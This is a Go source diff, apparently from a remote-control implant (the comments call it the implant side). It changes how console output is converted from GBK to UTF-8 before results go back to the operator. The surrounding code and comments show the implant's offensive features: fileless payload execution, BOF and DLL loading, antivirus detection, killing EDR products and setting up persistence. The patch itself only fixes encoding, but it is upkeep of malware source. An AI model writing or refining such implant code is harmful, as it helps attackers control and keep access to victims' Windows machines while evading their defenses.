@@ -1802,15 +1802,25 @@ func executeTask(task Task) Result {
 		}
 	}
 
-	// Windows下将输出从GBK转换为UTF-8（file_list/av_detect 除外，它们的输出本身已是 UTF-8）
-	// exec_module / fileless_exec 同样排除：这两条路径的回执里带植入端自己写的中文标注
-	// （exec_module："镜像已释放…"；fileless_exec：退出拦截/输出捕获那几行），
-	// 整体过一遍 GBK→UTF-8 会把 UTF-8 的中文标注打成乱码。
-	// 载荷自己的输出（GBK 控制台程序）由捕获侧按流单独判编码转换（guardDecodeConsole），
-	// BOF 输出则在 handleFilelessExec 里显式转一次，因此这里排除不会造成输出乱码。
-	if runtime.GOOS == "windows" && output != "" && task.TaskType != "file_list" && task.TaskType != "av_detect" && task.TaskType != "exec_module" && task.TaskType != "fileless_exec" {
-		output = string(gbkToUTF8([]byte(output)))
+	// 输出编码归一（Windows 控制台常见 GBK/CP936）——**逐行判定**，不再整串无脑转。
+	//
+	// 历史 bug（本次修复目标）：旧实现对整串输出无条件跑 gbkToUTF8，把植入端自己写的
+	// UTF-8 中文回执（EDR 击杀的"击杀"、持久化的"持久化成功"、启动项 JSON 里的中文描述）
+	// 当成 GBK 又转了一次 → 界面显示"鍑绘潃 / 娉ㄥ唽琛ㄥ惎鍔"。而这些回执里同时可能
+	// 嵌着被调中文工具（taskkill/reg/sc…）吐的真实 GBK，一串两种编码，整串转只能对一边。
+	// decodeConsoleText 逐行只看"这一行是不是合法 UTF-8"：合法行原样保留（含植入端 UTF-8
+	// 中文与 base64 JSON），非法行才按 GBK 转；且对合法 UTF-8 输入幂等，捕获点重复调用无害。
+	// 也正因为幂等，file_list/av_detect/exec_module/fileless_exec 这些"输出自带 UTF-8"的
+	// 特例不再需要 —— 它们现在天然不会被改动。
+	//
+	// 为什么必须在客户端先转一次：结果帧走 json.Marshal(Result)，非法 UTF-8 字节会被替换成
+	// U+FFFD（字节永久丢失），服务端解码救不回来；服务端展示层转换只兜旧版本载荷/其它来源。
+	if output != "" {
+		output = decodeConsoleText(output)
 	}
+	// 错误文本同理：很多失败分支把命令的原始 GBK 输出拼进 errMsg（如
+	// "注册表写入失败: ...\n<GBK 输出>"），不归一的话它会以 U+FFFD 落到界面上。
+	errMsg = decodeConsoleText(errMsg)
 
 	return Result{
 		TaskID:   task.ID,
@@ -1854,8 +1864,10 @@ func handleFilelessExec(data string) (string, int32, string) {
 		return runBlob(req.PayloadB64)
 	case "bof":
 		out, code, errMsg := loadBOF(req.PayloadB64, req.Args)
-		if runtime.GOOS == "windows" && out != "" {
-			out = string(gbkToUTF8([]byte(out)))
+		if out != "" {
+			// 只转"不是合法 UTF-8 的行"：BOF 自己的 printf 可能是 GBK，但回执里也可能
+			// 混着 UTF-8 文本（含植入端标注），整串硬转会把它打成乱码。
+			out = decodeConsoleText(out)
 		}
 		return out, code, errMsg
 	case "dll":
